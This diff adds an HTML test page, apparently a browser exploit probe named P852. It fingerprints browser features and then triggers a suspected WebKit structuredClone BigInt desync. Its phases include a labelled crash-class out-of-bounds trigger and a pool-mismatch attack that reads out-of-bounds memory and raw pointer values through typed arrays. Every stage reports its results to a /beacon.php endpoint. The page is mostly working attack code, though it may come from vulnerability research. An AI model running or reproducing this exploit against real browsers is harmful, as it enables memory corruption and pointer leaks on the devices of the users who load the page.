@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P852</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P852: structuredClone BigInt Desync + Feature Survey</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P852-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+bn('BOOT','start');
+log('structuredClone BigInt desync + feature survey','info');
+log('','');
+
+/* ===================================================================
+   PHASE A: Feature detection
+   =================================================================== */
+log('--- PHASE A: Feature Detection ---','hot');
+var features={};
+
+/* ResizableArrayBuffer */
+try{
+  var rab=new ArrayBuffer(8,{maxByteLength:64});
+  features.RAB='YES|bl='+rab.byteLength+'|max='+rab.maxByteLength;
+  log('  RAB: YES ('+rab.byteLength+'/'+rab.maxByteLength+')','ok');
+}catch(e){
+  features.RAB='NO|'+e.message.slice(0,60);
+  log('  RAB: NO ('+e.message.slice(0,60)+')','fail');
+}
+
+/* GrowableSharedArrayBuffer */
+try{
+  var gsab=new SharedArrayBuffer(8,{maxByteLength:64});
+  features.GSAB='YES';
+  log('  GSAB: YES','ok');
+}catch(e){
+  features.GSAB='NO|'+e.message.slice(0,60);
+  log('  GSAB: NO','fail');
+}
+
+/* BigInt */
+try{
+  var tb=0n;
+  features.BigInt='YES';
+  log('  BigInt: YES','ok');
+}catch(e){
+  features.BigInt='NO';
+  log('  BigInt: NO','fail');
+}
+
+/* structuredClone */
+try{
+  var tc=structuredClone({x:1});
+  features.SC='YES';
+  log('  structuredClone: YES','ok');
+}catch(e){
+  features.SC='NO|'+e.message.slice(0,60);
+  log('  structuredClone: NO','fail');
+}
+
+/* structuredClone with BigInt */
+try{
+  var tcb=structuredClone([1n,2n,3n]);
+  features.SC_BigInt='YES|len='+tcb.length+'|t0='+typeof tcb[0];
+  log('  SC+BigInt: YES (len='+tcb.length+', type='+typeof tcb[0]+')','ok');
+}catch(e){
+  features.SC_BigInt='NO|'+e.message.slice(0,60);
+  log('  SC+BigInt: NO ('+e.message.slice(0,60)+')','fail');
+}
+
+/* structuredClone with transfer */
+try{
+  var tab=new ArrayBuffer(16);
+  var tcc=structuredClone(tab,{transfer:[tab]});
+  features.SC_Transfer='YES|bl='+tcc.byteLength+'|det='+tab.detached;
+  log('  SC+Transfer: YES (bl='+tcc.byteLength+')','ok');
+}catch(e){
+  features.SC_Transfer='NO|'+e.message.slice(0,60);
+  log('  SC+Transfer: NO','fail');
+}
+
+/* Crypto subtle */
+try{
+  features.Crypto=typeof crypto.subtle==='object'?'YES':'NO';
+  log('  crypto.subtle: '+features.Crypto,'info');
+}catch(e){features.Crypto='NO';}
+
+/* Intl.Segmenter */
+try{
+  var seg=new Intl.Segmenter();
+  features.Segmenter='YES';
+  log('  Intl.Segmenter: YES','ok');
+}catch(e){
+  features.Segmenter='NO';
+  log('  Intl.Segmenter: NO','fail');
+}
+
+/* Temporal */
+try{
+  var tp=new Temporal.PlainDate(2026,1,1);
+  features.Temporal='YES';
+  log('  Temporal: YES','ok');
+}catch(e){
+  features.Temporal='NO';
+  log('  Temporal: NO','fail');
+}
+
+/* Iterator.from */
+try{
+  features.IteratorFrom=typeof Iterator!=='undefined'&&typeof Iterator.from==='function'?'YES':'NO';
+  log('  Iterator.from: '+features.IteratorFrom,'info');
+}catch(e){features.IteratorFrom='NO';}
+
+/* ArrayBuffer.prototype.transfer */
+try{
+  var atab=new ArrayBuffer(8);
+  var atab2=atab.transfer();
+  features.AB_Transfer='YES|det='+atab.detached;
+  log('  AB.transfer: YES','ok');
+}catch(e){
+  features.AB_Transfer='NO|'+e.message.slice(0,60);
+  log('  AB.transfer: NO','fail');
+}
+
+bn('A-FEATURES',Object.keys(features).map(function(k){return k+'='+features[k];}).join('|'));
+
+/* ===================================================================
+   PHASE B: structuredClone BigInt desync — SAFE variants
+   (from cand-b-psych: test m_gcBuffer/m_objectPool mismatch)
+   =================================================================== */
+log('','');
+log('--- PHASE B: structuredClone BigInt Desync ---','hot');
+
+/* B1: Safe dedup discriminator — 65536 BigInts + Array(3) */
+try{
+  log('  B1: 65536 BigInt + Array(3) safe variant...','info');
+  var b1arr=[];
+  for(var i=0;i<65536;i++)b1arr.push(1n << (40n + BigInt(i%60)));
+  var b1obj=[b1arr, {m:0x51}, {m:0x51}, new Array(3)];
+  var b1out=structuredClone(b1obj);
+  var b1r='len='+b1out.length+'|a0len='+b1out[0].length+'|t='+typeof b1out[0][0];
+  log('  B1 survived: '+b1r,'ok');
+  bn('B1',b1r);
+}catch(e){
+  log('  B1 THREW: '+e.message.slice(0,80),'fail');
+  bn('B1','ERR|'+e.message.slice(0,200));
+}
+
+/* B2: Wire width desync — 260 items, item 255 = BigInt */
+try{
+  log('  B2: 260 items, item[255]=BigInt...','info');
+  var b2arr=[];
+  for(var i=0;i<260;i++)b2arr.push(i===255 ? 1n : ('s'+i));
+  var b2out=structuredClone(b2arr);
+  var b2r='len='+b2out.length+'|t255='+typeof b2out[255]+'|v255='+String(b2out[255]).slice(0,20);
+  /* Check if any items shifted type */
+  var b2shift=0;
+  for(var i=0;i<260;i++){
+    if(i===255){if(typeof b2out[i]!=='bigint')b2shift++;}
+    else{if(typeof b2out[i]!=='string')b2shift++;}
+  }
+  b2r+='|shift='+b2shift;
+  log('  B2 survived: '+b2r,'ok');
+  bn('B2',b2r);
+}catch(e){
+  log('  B2 THREW: '+e.message.slice(0,80),'fail');
+  bn('B2','ERR|'+e.message.slice(0,200));
+}
+
+/* B3: Boundary-span — JSON-safe objects across clone boundary */
+try{
+  log('  B3: boundary span clone...','info');
+  var b3obj=[{x:1},new Array(133),new Array(133),{y:2}];
+  var b3out=structuredClone(b3obj);
+  var b3ok=JSON.stringify([b3out[0],b3out[3]])===JSON.stringify([{x:1},{y:2}]);
+  log('  B3 survived: roundtrip='+b3ok,'ok');
+  bn('B3','ok='+b3ok);
+}catch(e){
+  log('  B3 THREW: '+e.message.slice(0,80),'fail');
+  bn('B3','ERR|'+e.message.slice(0,200));
+}
+
+/* ===================================================================
+   PHASE C: structuredClone BigInt OOB trigger (CRASH CLASS)
+   65536 BigInts + Array(0x8000) — may cause negative-index OOB
+   =================================================================== */
+log('','');
+log('--- PHASE C: BigInt OOB Trigger (crash class) ---','hot');
+bn('C-PRE','about-to-trigger');
+
+try{
+  log('  C: 65536 BigInt + Array(0x8000) OOB trigger...','info');
+  var carr=[];
+  for(var i=0;i<65536;i++)carr.push(1n << (40n + BigInt(i%60)));
+  var cobj=[carr, {m:0x51}, {m:0x51}, new Array(0x8000)];
+  var cout=structuredClone(cobj);
+  /* If we get here, either the bug is patched or the OOB didn't crash */
+  var cr='survived|len='+cout.length+'|a0len='+cout[0].length+'|a3len='+cout[3].length;
+  /* Check for anomalies in the output */
+  var cano=0;
+  if(cout.length!==4)cano++;
+  if(cout[0].length!==65536)cano++;
+  if(cout[3].length!==0x8000)cano++;
+  if(typeof cout[1]!=='object')cano++;
+  cr+='|ano='+cano;
+  log('  C survived: '+cr,'ok');
+  bn('C',cr);
+}catch(e){
+  log('  C THREW: '+e.message.slice(0,120),'fail');
+  bn('C','ERR|'+e.message.slice(0,300));
+}
+
+/* ===================================================================
+   PHASE D: Pool mismatch with RAB (if available)
+   p285-style: BigInt shifts ObjectReference index → Float64Array on wrong buffer
+   =================================================================== */
+log('','');
+log('--- PHASE D: Pool Mismatch + RAB ---','hot');
+
+if(features.RAB && features.RAB.indexOf('YES')===0){
+  bn('D-PRE','RAB-available');
+  try{
+    log('  D: BigInt pool mismatch with RAB...','info');
+    var small_rab=new ArrayBuffer(8,{maxByteLength:64});
+    var large_rab=new ArrayBuffer(8192,{maxByteLength:16384});
+    /* Pool order: outer obj=0, small_rab=1, large_rab=2, view=3 (refs pool[2]) */
+    /* With 1 BigInt before view: shift by 1 → view resolves to pool[1]=small_rab */
+    var dobj={
+      a: small_rab,
+      b: large_rab,
+      c: 42n,  /* BigInt shifts gcBuffer */
+      d: new Float64Array(large_rab, 0, 1024)
+    };
+    var dout=structuredClone(dobj);
+    /* If shift happened, d.d.buffer === small (8B) but d.d.length === 1024 → OOB! */
+    var dr='d.len='+dout.d.length+'|d.buf.bl='+dout.d.buffer.byteLength;
+    if(dout.d.buffer.byteLength < dout.d.length * 8){
+      log('  *** OOB DETECTED! buffer='+dout.d.buffer.byteLength+' < view needs '+(dout.d.length*8)+' ***','hot');
+      /* Read OOB data! */
+      var oob=[];
+      for(var i=0;i<Math.min(dout.d.length,16);i++){
+        var v=dout.d[i];
+        if(v!==0)oob.push('f64['+i+']='+v);
+      }
+      dr+='|OOB='+oob.join(',');
+      /* Try BigUint64Array for raw pointer reads */
+      try{
+        var bu64=new BigUint64Array(dout.d.buffer);
+        var rawOob=[];
+        for(var i=0;i<Math.min(bu64.length,16);i++){
+          if(bu64[i]!==0n)rawOob.push('q'+i+'=0x'+bu64[i].toString(16));
+        }
+        dr+='|RAW='+rawOob.join(',');
+      }catch(e){}
+    }
+    log('  D result: '+dr,'info');
+    bn('D',dr);
+  }catch(e){
+    log('  D THREW: '+e.message.slice(0,120),'fail');
+    bn('D','ERR|'+e.message.slice(0,300));
+  }
+}else{
+  log('  D: SKIPPED (no RAB)','fail');
+  bn('D','SKIP-no-RAB');
+}
+
+/* ===================================================================
+   PHASE E: Pool mismatch WITHOUT RAB (non-resizable variant)
+   Even without RAB, the BigInt gcBuffer shift may confuse pool indices
+   =================================================================== */
+log('','');
+log('--- PHASE E: Pool Mismatch NO RAB ---','hot');
+bn('E-PRE','start');
+
+try{
+  log('  E: BigInt pool mismatch (plain ArrayBuffer)...','info');
+  var e_small=new ArrayBuffer(8);
+  var e_large=new ArrayBuffer(8192);
+  /* Write marker to large buffer */
+  var eLV=new Float64Array(e_large);
+  for(var i=0;i<1024;i++)eLV[i]=i*1.5+0.25;
+  var eobj={
+    a: e_small,
+    b: e_large,
+    c: 42n,
+    d: new Float64Array(e_large)
+  };
+  var eout=structuredClone(eobj);
+  /* Check if d's buffer is large or small */
+  var er='d.len='+eout.d.length+'|d.buf.bl='+eout.d.buffer.byteLength;
+  /* Check if view got wrong buffer */
+  if(eout.d.buffer.byteLength !== 8192){
+    log('  *** BUFFER MISMATCH! Expected 8192, got '+eout.d.buffer.byteLength+' ***','hot');
+    er+='|MISMATCH=true';
+  }
+  /* Check data integrity */
+  var eCorrupt=0;
+  for(var i=0;i<Math.min(eout.d.length,8);i++){
+    if(eout.d[i]!==i*1.5+0.25)eCorrupt++;
+  }
+  er+='|corrupt='+eCorrupt;
+
+  /* Multi-BigInt variant: 3 BigInts to shift by 3 */
+  var eobj2={
+    a: e_small,
+    b: new ArrayBuffer(4096),
+    c1: 1n, c2: 2n, c3: 3n,
+    d: new Float64Array(new ArrayBuffer(4096))
+  };
+  var eout2=structuredClone(eobj2);
+  er+='|v2.d.bl='+eout2.d.buffer.byteLength;
+
+  log('  E result: '+er,'info');
+  bn('E',er);
+}catch(e){
+  log('  E THREW: '+e.message.slice(0,120),'fail');
+  bn('E','ERR|'+e.message.slice(0,300));
+}
+
+/* ===================================================================
+   PHASE F: Proxy + structuredClone interactions
+   =================================================================== */
+log('','');
+log('--- PHASE F: Proxy/Revoke + structuredClone ---','hot');
+
+try{
+  log('  F1: revoked Proxy in structuredClone...','info');
+  var rv=Proxy.revocable({},{});
+  rv.revoke();
+  var f1out=structuredClone([rv.proxy]);
+  log('  F1 survived: len='+f1out.length+', t0='+typeof f1out[0],'ok');
+  bn('F1','ok|len='+f1out.length);
+}catch(e){
+  log('  F1 THREW: '+e.message.slice(0,80),'fail');
+  bn('F1','ERR|'+e.message.slice(0,100));
+}
+
+try{
+  log('  F2: Proxy with getOwnPropertyDescriptor trap...','info');
+  var f2trap=0;
+  var f2p=new Proxy({x:1,y:2},{
+    getOwnPropertyDescriptor:function(t,p){
+      f2trap++;
+      return Object.getOwnPropertyDescriptor(t,p);
+    }
+  });
+  var f2out=structuredClone(f2p);
+  log('  F2 survived: traps='+f2trap+', x='+f2out.x,'ok');
+  bn('F2','ok|traps='+f2trap+'|x='+f2out.x);
+}catch(e){
+  log('  F2 THREW: '+e.message.slice(0,80),'fail');
+  bn('F2','ERR|'+e.message.slice(0,100));
+}
+
+/* ===================================================================
+   PHASE G: Additional WebKit surface
+   =================================================================== */
+log('','');
+log('--- PHASE G: Additional WebKit Surface ---','hot');
+
+/* TextEncoder/TextDecoder */
+try{
+  var enc=new TextEncoder();
+  var dec=new TextDecoder();
+  var buf=enc.encode('hello');
+  features.TextCodec='YES|'+buf.length+'B';
+  log('  TextEncoder/Decoder: YES','ok');
+}catch(e){features.TextCodec='NO';}
+
+/* queueMicrotask */
+try{
+  features.Microtask=typeof queueMicrotask==='function'?'YES':'NO';
+  log('  queueMicrotask: '+features.Microtask,'info');
+}catch(e){features.Microtask='NO';}
+
+/* reportError */
+try{
+  features.ReportError=typeof reportError==='function'?'YES':'NO';
+  log('  reportError: '+features.ReportError,'info');
+}catch(e){features.ReportError='NO';}
+
+/* AbortController */
+try{
+  var ac=new AbortController();
+  features.AbortController='YES';
+  log('  AbortController: YES','ok');
+}catch(e){features.AbortController='NO';log('  AbortController: NO','fail');}
+
+/* Compression streams */
+try{
+  var cs=new CompressionStream('gzip');
+  features.Compression='YES';
+  log('  CompressionStream: YES','ok');
+}catch(e){
+  features.Compression='NO|'+e.message.slice(0,40);
+  log('  CompressionStream: NO','fail');
+}
+
+/* IntersectionObserver */
+try{
+  features.IntObs=typeof IntersectionObserver==='function'?'YES':'NO';
+  log('  IntersectionObserver: '+features.IntObs,'info');
+}catch(e){features.IntObs='NO';}
+
+/* ResizeObserver */
+try{
+  features.ResObs=typeof ResizeObserver==='function'?'YES':'NO';
+  log('  ResizeObserver: '+features.ResObs,'info');
+}catch(e){features.ResObs='NO';}
+
+/* MutationObserver */
+try{
+  features.MutObs=typeof MutationObserver==='function'?'YES':'NO';
+  log('  MutationObserver: '+features.MutObs,'info');
+}catch(e){features.MutObs='NO';}
+
+/* Performance.now resolution */
+try{
+  var pSamples=[];
+  for(var i=0;i<20;i++){
+    var t1=performance.now();
+    var t2=performance.now();
+    if(t2>t1)pSamples.push(t2-t1);
+  }
+  var pMin=pSamples.length>0?Math.min.apply(null,pSamples):0;
+  features.PerfRes=pMin.toFixed(4)+'ms';
+  log('  performance.now min delta: '+features.PerfRes,'info');
+}catch(e){features.PerfRes='N/A';}
+
+bn('G-FEATURES',Object.keys(features).map(function(k){return k+'='+features[k];}).join('|'));
+
+log('','');
+log('====== P852 COMPLETE ======','hot');
+bn('DONE','complete');
+</script></body></html>
